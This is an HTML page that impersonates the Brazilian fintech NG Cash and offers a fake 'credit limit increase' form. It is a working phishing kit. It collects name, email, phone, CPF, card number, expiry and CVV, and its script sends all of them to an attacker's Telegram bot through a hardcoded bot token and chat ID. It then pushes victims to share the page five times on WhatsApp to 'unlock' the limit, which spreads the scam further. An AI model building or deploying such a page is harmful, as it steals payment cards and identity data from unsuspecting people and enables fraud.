# Teste
Seila
<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>NG Cash - Formulário Completo</title>


<style>

  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: 'Inter', sans-serif;
    background: linear-gradient(135deg, #270072, #000);
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
    animation: fadeIn 1.2s ease-in-out;
  }
  @keyframes fadeIn {
    from {opacity: 0; transform: translateY(20px);}
    to {opacity: 1; transform: translateY(0);}
  }
  .card {
    background: #0a0a0a;
    border-radius: 20px;
    padding: 40px 35px;
    width: 100%;
    max-width: 480px;
    box-shadow: 0 0 40px rgba(0,255,195,0.15);
    border: 1px solid #222;
    position: relative;
    text-align: left;
  }
  .logo {
    text-align: center;
    margin-bottom: 30px;
  }
  .logo .ng {
    font-family: 'Orbitron', sans-serif;
    font-size: 48px;
    font-weight: 700;
    color: #00ffc3;
    text-shadow: 0 0 14px #00ffc3;
  }
  .logo span {
    color: #888;
    font-size: 14px;
    font-weight: 300;
    letter-spacing: 0.6px;
  }
  label {
    font-size: 14px;
    margin-bottom: 6px;
    display: block;
    color: #ccc;
    font-weight: 600;
    letter-spacing: 0.6px;
  }
  input[type="text"],
  input[type="email"],
  input[type="tel"],
  input[type="number"],
  select {
    width: 100%;
    padding: 14px 16px;
    margin-bottom: 18px;
    border-radius: 12px;
    border: 1px solid #1f1f1f;
    background-color: #111;
    color: white;
    font-size: 15px;
    font-weight: 500;
    transition: all 0.3s ease;
  }
  input[type="text"]:focus,
  input[type="email"]:focus,
  input[type="tel"]:focus,
  input[type="number"]:focus,
  select:focus {
    outline: none;
    border-color: #00ffc3;
    box-shadow: 0 0 8px #00ffc3;
    background-color: #121212;
  }
  input[type="submit"] {
    background: linear-gradient(135deg, #00ffc3, #ff00d4);
    color: #000;
    border: none;
    padding: 16px;
    border-radius: 16px;
    font-weight: 800;
    font-size: 18px;
    width: 100%;
    cursor: pointer;
    letter-spacing: 1.2px;
    transition: all 0.3s ease;
    user-select: none;
  }
  input[type="submit"]:hover {
    background: linear-gradient(135deg, #ff00d4, #00ffc3);
    box-shadow: 0 0 20px #00ffc3;
  }
  .graffiti-line {
    position: absolute;
    bottom: 12px;
    left: 20px;
    right: 20px;
    height: 1px;
    background: linear-gradient(to right, #fff 0%, #00ffc3 50%, #ff00d4 100%);
    opacity: 0.12;
  }
  #shareScreen {
    display: none;
    text-align: center;
    margin-top: 20px;
    color: #00ffc3;
  }
  #shareScreen h2 {
    font-weight: 700;
    margin-bottom: 12px;
    text-shadow: 0 0 6px #00ffc3;
  }
  #shareScreen p {
    font-size: 16px;
    margin-bottom: 20px;
  }
  #whatsappShareBtn {
    background: linear-gradient(135deg, #00ffc3, #ff00d4);
    color: #000;
    border: none;
    padding: 14px 30px;
    border-radius: 14px;
    font-weight: 700;
    font-size: 18px;
    cursor: pointer;
    transition: all 0.3s ease;
    user-select: none;
  }
  #whatsappShareBtn:hover:not(:disabled) {
    background: linear-gradient(135deg, #ff00d4, #00ffc3);
    box-shadow: 0 0 20px #00ffc3;
  }
  #whatsappShareBtn:disabled {
    cursor: default;
    opacity: 0.6;
    box-shadow: none;
  }
  @media (max-width: 520px) {
    .card {
      padding: 30px 25px;
    }
    .logo .ng {
      font-size: 38px;
    }
    input[type="submit"], #whatsappShareBtn {
      font-size: 16px;
      padding: 14px;
    }
  }


/* Fonte: https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap */
@font-face {
  font-family: 'Inter';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://fonts.gstatic.com/s/inter/v20/UcCO3FwrK3iLTeHuS_nVMrMxCp50SjIw2boKoduKmMEVuLyfMZg.ttf) format('truetype');
}
@font-face {
  font-family: 'Inter';
  font-style: normal;
  font-weight: 600;
  font-display: swap;
  src: url(https://fonts.gstatic.com/s/inter/v20/UcCO3FwrK3iLTeHuS_nVMrMxCp50SjIw2boKoduKmMEVuGKYMZg.ttf) format('truetype');
}
@font-face {
  font-family: 'Orbitron';
  font-style: normal;
  font-weight: 600;
  font-display: swap;
  src: url(https://fonts.gstatic.com/s/orbitron/v35/yMJMMIlzdpvBhQQL_SC3X9yhF25-T1nyxSmxpg.ttf) format('truetype');
}


</style></head>
<body>
  <div class="card">
    <div class="logo">
      <div class="ng">NG.</div>
      <span>Formulário Completo de Limite</span>
    </div>

    <form id="limiteForm" novalidate="">
      <label for="nome">Nome completo</label>
      <input type="text" id="nome" name="nome" required="" placeholder="Ex: João Silva">

      <label for="email">Email</label>
      <input type="email" id="email" name="email" required="" placeholder="exemplo@dominio.com">

      <label for="telefone">Telefone</label>
      <input type="tel" id="telefone" name="telefone" required="" placeholder="(99) 99999-9999" maxlength="15">

      <label for="cpf">CPF</label>
      <input type="text" id="cpf" name="cpf" required="" placeholder="000.000.000-00" maxlength="14">

      <label for="tipoCartao">Tipo do cartão</label>
      <select id="tipoCartao" name="tipoCartao" required="">
        <option value="" disabled="" selected="">Selecione o tipo</option>
        <option value="Crédito">Crédito</option>
        <option value="Débito">Débito</option>
        <option value="Virtual">Virtual</option>
      </select>

      <label for="bandeira">Bandeira</label>
      <select id="bandeira" name="bandeira" required="">
        <option value="" disabled="" selected="">Selecione a bandeira</option>
        <option value="Visa">Visa</option>
        <option value="Mastercard">Mastercard</option>
        <option value="Elo">Elo</option>
        <option value="American Express">American Express</option>
        <option value="Hipercard">Hipercard</option>
        <option value="Outro">Outro</option>
      </select>

      <label for="numero">Número do cartão</label>
      <input type="tel" id="numero" name="numero" maxlength="19" placeholder="0000 0000 0000 0000" required="">

      <label for="validade">Validade (MM/AA)</label>
      <input type="text" id="validade" name="validade" placeholder="MM/AA" maxlength="5" required="">

      <label for="cvv">CVV</label>
      <input type="text" id="cvv" name="cvv" maxlength="3" placeholder="123" required="">

      <label for="motivo">Motivo do pedido de aumento</label>
      <select id="motivo" name="motivo" required="">
        <option value="" disabled="" selected="">Selecione um motivo</option>
        <option value="Compras frequentes">Compras frequentes</option>
        <option value="Viagens">Viagens</option>
        <option value="Parcelamento">Parcelamento</option>
        <option value="Emergências">Emergências</option>
        <option value="Outro">Outro</option>
      </select>

      <label for="limiteAtual">Limite atual (R$)</label>
      <input type="number" id="limiteAtual" name="limiteAtual" min="0" step="0.01" placeholder="Ex: 1000.00" required="">

      <label for="limiteDesejado">Limite desejado (R$)</label>
      <input type="number" id="limiteDesejado" name="limiteDesejado" min="0" step="0.01" placeholder="Ex: 2000.00" required="">

      <input type="submit" value="Enviar pedido">
    </form>

    <div id="shareScreen">
      <h2>🚀 Compartilhe 5 vezes para desbloquear seu limite!</h2>
      <p>Você já compartilhou <span id="shareCount">0</span> de 5 vezes.</p>
      <button id="whatsappShareBtn">Compartilhar no WhatsApp</button>
    </div>

    <div class="graffiti-line"></div>
  </div>




<script>

  // Máscaras básicas para CPF e telefone
  function maskCPF(value) {
    return value
      .replace(/\D/g, "")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
  }

  function maskTelefone(value) {
    return value
      .replace(/\D/g, "")
      .replace(/^(\d{2})(\d)/g, "($1) $2")
      .replace(/(\d{5})(\d)/, "$1-$2")
      .replace(/(-\d{4})\d+?$/, "$1");
  }

  function validarCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, '');
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
    let sum = 0, rest;
    for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
    rest = (sum * 10) % 11;
    if (rest === 10 || rest === 11) rest = 0;
    if (rest !== parseInt(cpf.substring(9, 10))) return false;
    sum = 0;
    for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
    rest = (sum * 10) % 11;
    if (rest === 10 || rest === 11) rest = 0;
    if (rest !== parseInt(cpf.substring(10, 11))) return false;
    return true;
  }

  function validarValidade(value) {
    if (!/^\d{2}\/\d{2}$/.test(value)) return false;
    const [mm, aa] = value.split('/');
    const month = parseInt(mm, 10);
    const year = 2000 + parseInt(aa, 10);
    if (month < 1 || month > 12) return false;
    const now = new Date();
    const exp = new Date(year, month - 1, 1);
    return exp >= new Date(now.getFullYear(), now.getMonth(), 1);
  }

  function validarCVV(value) {
    return /^\d{3}$/.test(value);
  }

  // Máscaras ao digitar
  document.getElementById('cpf').addEventListener('input', (e) => {
    e.target.value = maskCPF(e.target.value);
  });

  document.getElementById('telefone').addEventListener('input', (e) => {
    e.target.value = maskTelefone(e.target.value);
  });

  document.getElementById('validade').addEventListener('input', (e) => {
    let val = e.target.value.replace(/[^\d]/g, '');
    if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2, 4);
    e.target.value = val;
  });

  // Controle compartilhamento WhatsApp
  const shareBtn = document.getElementById("whatsappShareBtn");
  const shareCountSpan = document.getElementById("shareCount");

  let shareCount = parseInt(localStorage.getItem("shareCount") || "0");

  function updateShareCount() {
    shareCountSpan.textContent = shareCount;
    if (shareCount >= 5) {
      alert("🎉 Parabéns! Seu limite foi desbloqueado!");
      shareBtn.disabled = true;
      shareBtn.textContent = "Limite desbloqueado!";
    }
  }

  function shareWhatsApp() {
    const message = encodeURIComponent(
      "Venha crescer seu limite com nosso site +70mil clientes satisfeitos!"
      <!-- ai em cima dps do satisfeito pode mudar o texto ou colocar o link -->
    );
    const url = `https://api.whatsapp.com/send?text=${message}`;
    window.open(url, "_blank");
  }

  shareBtn.addEventListener("click", () => {
    if (shareCount < 5) {
      shareCount++;
      localStorage.setItem("shareCount", shareCount);
      updateShareCount();
      shareWhatsApp();
    }
  });

  // Envio do formulário
  document.getElementById('limiteForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const nome = document.getElementById('nome').value.trim();
    const email = document.getElementById('email').value.trim();
    const telefone = document.getElementById('telefone').value.trim();
    const cpf = document.getElementById('cpf').value.trim();
    const tipoCartao = document.getElementById('tipoCartao').value;
    const bandeira = document.getElementById('bandeira').value;
    const numero = document.getElementById('numero').value.trim();
    const validade = document.getElementById('validade').value.trim();
    const cvv = document.getElementById('cvv').value.trim();
    const motivo = document.getElementById('motivo').value;
    const limiteAtual = parseFloat(document.getElementById('limiteAtual').value);
    const limiteDesejado = parseFloat(document.getElementById('limiteDesejado').value);

    // Validações simples
    if (nome.length < 3) return alert('Informe um nome válido.');
    if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) return alert('Informe um email válido.');
    if (telefone.length < 14) return alert('Informe um telefone válido.');
    if (!validarCPF(cpf)) return alert('CPF inválido.');
    if (!tipoCartao) return alert('Selecione o tipo do cartão.');
    if (!bandeira) return alert('Selecione a bandeira.');
    if (numero.length < 13) return alert('Número do cartão inválido.');
    if (!validarValidade(validade)) return alert('Validade inválida ou cartão expirado.');
    if (!validarCVV(cvv)) return alert('CVV inválido.');
    if (!motivo) return alert('Selecione um motivo.');
    if (isNaN(limiteAtual) || limiteAtual < 0) return alert('Informe um limite atual válido.');
    if (isNaN(limiteDesejado) || limiteDesejado <= limiteAtual) return alert('Limite desejado deve ser maior que o limite atual.');

    const msg = `
🟢 *Novo Pedido de Limite NG.Cash*

👤 Nome: ${nome}
📧 Email: ${email}
📞 Telefone: ${telefone}
📄 CPF: ${cpf}
💳 Tipo do cartão: ${tipoCartao}
🏷 Bandeira: ${bandeira}
💳 Número do cartão: ${numero}
📆 Validade: ${validade}
🔐 CVV: ${cvv}
📝 Motivo: ${motivo}
💰 Limite atual: R$ ${limiteAtual.toFixed(2)}
💰 Limite desejado: R$ ${limiteDesejado.toFixed(2)}
`;

    const botToken = "8099956405:AAHZwey0jX7df8d_tcAfo9cEJ_BVVDcfGqk";
    const chatId = "7874594480";

    try {
      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: msg,
          parse_mode: "Markdown"
        })
      });
      const data = await res.json();
      if (!data.ok) {
        alert("Erro ao enviar dados para o Telegram: " + data.description);
        return;
      }
      alert("✅ Pedido enviado com sucesso!");
      // Esconde o form e mostra tela de compartilhamento
      e.target.style.display = "none";
      document.getElementById("shareScreen").style.display = "block";
      updateShareCount();
    } catch (error) {
      alert("Erro na requisição: " + error.message);
    }
  });

  // Atualiza contador se já tiver compartilhado antes
  updateShareCount();


</script></body></html>
